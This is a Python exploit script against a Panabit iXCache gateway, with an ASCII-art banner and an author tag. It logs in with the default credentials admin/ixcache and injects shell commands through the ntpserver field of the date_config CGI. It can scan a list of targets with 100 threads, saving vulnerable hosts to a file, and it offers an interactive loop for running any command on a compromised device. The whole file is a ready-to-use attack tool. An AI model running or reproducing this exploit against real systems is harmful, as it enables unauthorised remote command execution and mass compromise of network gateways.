# Panabit iXCache网关RCE漏洞
import requests,argparse,sys,time,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    banner = """
██╗██╗  ██╗ ██████╗ █████╗  ██████╗██╗  ██╗███████╗    ██████╗  ██████╗███████╗
██║╚██╗██╔╝██╔════╝██╔══██╗██╔════╝██║  ██║██╔════╝    ██╔══██╗██╔════╝██╔════╝
██║ ╚███╔╝ ██║     ███████║██║     ███████║█████╗█████╗██████╔╝██║     █████╗  
██║ ██╔██╗ ██║     ██╔══██║██║     ██╔══██║██╔══╝╚════╝██╔══██╗██║     ██╔══╝  
██║██╔╝ ██╗╚██████╗██║  ██║╚██████╗██║  ██║███████╗    ██║  ██║╚██████╗███████╗
╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝    ╚═╝  ╚═╝ ╚═════╝╚══════╝
                                                      author:daesen804
                                                      version:1.0.0                         
"""
    print(banner)

def main():
    banner()
    parser = argparse.ArgumentParser(description="Panabit iXCache网关RCE漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='Please input your url')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please input your file path')

    args = parser.parse_args()
    if args.url and not args.file:
        if poc(args.url):
            exp(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


def poc(target):
    url_payload1 = '/login/userverify.cgi'
    url_payload2 = '/cgi-bin/Maintain/date_config'
    headers1 = {
        'User-Agent':'Mozilla/5.0(Macintosh;IntelMacOSX10.15;rv:109.0)Gecko/20100101Firefox/115.0',
        'Accept-Encoding':'gzip,deflate',
        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Connection':'close',
        'Accept-Language':'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Content-Type':'application/x-www-form-urlencoded',
        'Content-Length':'31',
        'Upgrade-Insecure-Requests':'1',
        'Sec-Fetch-Dest':'document',
        'Sec-Fetch-Mode':'navigate',
        'Sec-Fetch-Site':'same-origin',
        'Sec-Fetch-User':'?1',
    }
    data1 = "username=admin&password=ixcache"
    
    headers2 = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': '90'
    }
    data2 = "ntpserver=0.0.0.0;whoami&year=2000&month=08&day=15&hour=11&minute=34&second=53&ifname=fxp1"

    session = requests.session()

    try:
        res1 = requests.post(url=target+url_payload1,headers=headers1,data=data1,timeout=10,verify=False)
        match1 = re.findall(r'0;URL=(.*?)">',res1.text,re.S)
        if res1.status_code == 200 and match1[0] == '/cgi-bin/monitor.cgi':
            res2 = session.post(url=target+url_payload2,headers=headers2,data=data2,cookies=res1.cookies,verify=False)
            match2 = re.findall(r'root',res2.text,re.S)
            if res2.status_code == 200 and match2[0] == 'root':
                with open('result.txt','a') as fp:
                    fp.write(target+'\n')
                print(f"[+]{target} 存在RCE漏洞")
                return True
        else:
            print(f"[-]{target} 不存在RCE漏洞")
    except:
        pass


def exp(target):
    print("--------------正在进行漏洞利用------------")
    time.sleep(2)
    while True:
        cmd = input("请输入要执行的命令：")
        if cmd == 'q':
            exit()

        url_payload1 = '/login/userverify.cgi'
        url_payload2 = '/cgi-bin/Maintain/date_config'
        headers1 = {
            'User-Agent':'Mozilla/5.0(Macintosh;IntelMacOSX10.15;rv:109.0)Gecko/20100101Firefox/115.0',
            'Accept-Encoding':'gzip,deflate',
            'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Connection':'close',
            'Accept-Language':'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
            'Content-Type':'application/x-www-form-urlencoded',
            'Content-Length':'31',
            'Upgrade-Insecure-Requests':'1',
            'Sec-Fetch-Dest':'document',
            'Sec-Fetch-Mode':'navigate',
            'Sec-Fetch-Site':'same-origin',
            'Sec-Fetch-User':'?1',
        }
        data1 = "username=admin&password=ixcache"
        
        headers2 = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Content-Length': '90'
        }
        data2 = f"ntpserver=0.0.0.0;{cmd}&year=2000&month=08&day=15&hour=11&minute=34&second=53&ifname=fxp1"

        session = requests.session()

        try:
            res1 = requests.post(url=target+url_payload1,headers=headers1,data=data1,timeout=10,verify=False)
            match1 = re.findall(r'0;URL=(.*?)">',res1.text,re.S)
            if res1.status_code == 200 and match1[0] == '/cgi-bin/monitor.cgi':
                res2 = session.post(url=target+url_payload2,headers=headers2,data=data2,cookies=res1.cookies,verify=False)
                if res2.status_code == 200:
                    print(res2.text)
            else:
                print("请输入其他命令")
        except:
            pass

if __name__ == "__main__":
    main()